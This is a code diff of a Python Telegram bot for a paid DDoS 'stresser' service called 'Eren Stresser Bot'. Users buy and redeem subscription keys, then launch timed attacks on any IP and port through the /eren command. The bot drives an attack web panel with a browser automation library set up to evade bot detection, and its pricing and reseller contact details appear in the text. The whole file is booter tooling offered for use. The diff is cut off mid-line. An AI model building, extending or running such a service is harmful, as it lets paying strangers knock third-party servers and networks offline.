@@ -16,7 +16,6 @@ import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException, WebDriverException
 
 # ────────────────────────────────────────────────
 # CONFIG
@@ -77,9 +76,9 @@ def redeem_key(key: str, user_id: int) -> tuple[bool, str]:
         conn.commit()
     return True, f"✅ Key redeemed! Valid for {days} days."
 
-# ──────── Selenium (Using Existing Chrome on Port 9222) ────────
-driver: uc.Chrome = None
-wait: WebDriverWait = None
+# ──────── Selenium ────────
+driver = None
+wait = None
 
 def init_browser():
     global driver, wait
@@ -89,25 +88,17 @@ def init_browser():
         options.add_argument("--disable-dev-shm-usage")
         options.add_argument("--disable-blink-features=AutomationControlled")
         options.add_argument("--disable-gpu")
+        options.add_argument("--window-size=1280,900")
         
-        # Connect to already running Chrome (started by .sh file)
-        driver = uc.Chrome(
-            options=options,
-            debugger_address="127.0.0.1:9222",
-            version_main=133  # ← Change this if your Chrome version is different
-        )
-        
+        driver = uc.Chrome(options=options, version_main=133)  # Change version if needed
         wait = WebDriverWait(driver, 25)
         
-        # Open panel only if not already there
-        if PANEL_URL not in driver.current_url:
-            logger.info(f"🌐 Opening panel: {PANEL_URL}")
-            driver.get(PANEL_URL)
-        else:
-            logger.info("✅ Already on panel page.")
+        logger.info(f"🌐 Opening panel: {PANEL_URL}")
+        driver.get(PANEL_URL)
         
-        logger.info("✅ Connected to existing Chrome browser successfully!")
-        logger.info("Wait 5-10 seconds after bot start for full load.")
+        logger.info("✅ Chrome launched and panel opened successfully!")
+        logger.info("Waiting 8 seconds for full page load...")
+        time.sleep(8)
        
     except Exception as e:
         logger.error(f"Browser init failed: {e}")
@@ -142,7 +133,7 @@ async def send_attack(ip: str, port: str, seconds: int):
         return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"
     
     except Exception as e:
-        return False, f"❌ Error: {str(e)}"
+        return False, f"❌ Error launching attack: {str(e)}"
 
 # ──────── Commands ────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -156,17 +147,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
     
     welcome_text = (
-        "👋 **Welcome to Bot!** 🚀\n\n"
+        "👋 **Welcome to Eren Stresser Bot!** 🚀\n\n"
         "🔥 **Fast 3 Node Stresser**\n"
         "🌍 **Nodes:** Singapore | Bangalore | Canada\n\n"
-        "**Available Commands:**\n"
-        "• `/eren <ip> <port> [time]` → Launch Attack (Max 60s)\n"
-        "• `/panel` → View All Nodes\n"
-        "• `/price` → Show Pricing\n"
-        "• `/redeem <key>` → Activate Subscription\n"
-        "• `/help` → Show Help"
+        "**Commands:**\n"
+        "`/eren <ip> <port> [time]` - Launch Attack (Max 60s)\n"
+        "`/panel` - View Nodes\n"
+        "`/price` - Show Pricing\n"
+        "`/redeem <key>` - Activate Key\n"
+        "`/help` - Show Help"
     )
-    await update.message.reply_html(welcome_text)
+    await update.message.reply_text(welcome_text, parse_mode="Markdown")
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await start(update, context)
@@ -174,7 +165,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 2:
-        await update.message.reply_text("Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
+        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
         return
     
     ip = args[0].strip()
@@ -190,25 +181,25 @@ async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Minimum time is 10 seconds.")
         return
     
-    msg = await update.message.reply_text("🔄 **Preparing Attack...**")
+    msg = await update.message.reply_text("🔄 **Preparing Attack...**", parse_mode="Markdown")
+    
     success, result = await send_attack(ip, port, seconds)
     
     if success:
         await msg.edit_text(result, parse_mode="Markdown")
-        await asyncio.sleep(seconds + 3)
+        await asyncio.sleep(seconds + 5)
         await update.message.reply_text(f"🏁 **Attack Finished**\n`{ip}:{port}` ({seconds}s)", parse_mode="Markdown")
     else:
-        await msg.edit_text(result)
+        await msg.edit_text(result, parse_mode="Markdown")
 
 async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
     price_text = (
         "💰 **Pricing**\n\n"
         "• 1 Day → 50₹\n"
         "• 7 Days → 300₹\n"
-        "• Resellers DM\n\n"
-        "Contact @LFX_EREN for purchase."
+        "• Resellers DM @LFX_EREN"
     )
-    await update.message.reply_text(price_text)
+    await update.message.reply_text(price_text, parse_mode="Markdown")
 
 async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -216,50 +207,23 @@ async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_photo(photo=open('2.jpg', 'rb'), caption="🇮🇳 **Node 2 - Bangalore**", parse_mode="Markdown")
         await update.message.reply_photo(photo=open('3.jpg', 'rb'), caption="🇨🇦 **Node 3 - Canada**", parse_mode="Markdown")
     except FileNotFoundError:
-        await update.message.reply_text("❌ Images not found.\nPlease put 1.jpg, 2.jpg and 3.jpg in bot folder.")
+        await update.message.reply_text("❌ Images not found. Put 1.jpg, 2.jpg, 3.jpg in bot folder.")
 
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("❌ No permission.")
+        await update.message.reply_text("❌ Only admins can generate keys.")
         return
     if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text("Usage: /genkey <days>")
+        await update.message.reply_text("Usage: `/genkey <days>`", parse_mode="Markdown")
         return
     days = int(context.args[0])
     key = generate_key(days)
-    await update.message.reply_text(f"✅ New key: <code>{key}</code>", parse_mode="HTML")
+    await update.message.reply_text(f"✅ **New Key Generated**\n`{key}`", parse_mode="Markdown")
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        await update.message.reply_text("Usage: /redeem <key>")
+        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown")
         return
     key = context.args[0].strip()
     ok, msg = redeem_key(key, update.effective_user.id)
-    await update.message.reply_text(msg)
-
-async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    start_time = context.bot_data.get("start_time", time.time())
-    delta = timedelta(seconds=int(time.time() - start_time))
-    await update.message.reply_text(f"⏳ Bot Uptime: {delta}")
-
-# ──────── MAIN ────────
-def main():
-    app = Application.builder().token(TOKEN).build()
-    app.bot_data["start_time"] = time.time()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_cmd))
-    app.add_handler(CommandHandler("eren", eren))
-    app.add_handler(CommandHandler("price", price))
-    app.add_handler(CommandHandler("panel", panel))
-    app.add_handler(CommandHandler("genkey", genkey))
-    app.add_handler(CommandHandler("redeem", redeem))
-    app.add_handler(CommandHandler("uptime", uptime))
-    
-    app.add_handler(MessageHandler(filters.COMMAND, lambda u,c: u.message.reply_text("Unknown command. Try /help")))
-    
-    print("🤖 Bot starting... (Using external Chrome on port 9222)")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
-
-if __name__ == "__main__":
-    main()
+    await update.message.reply
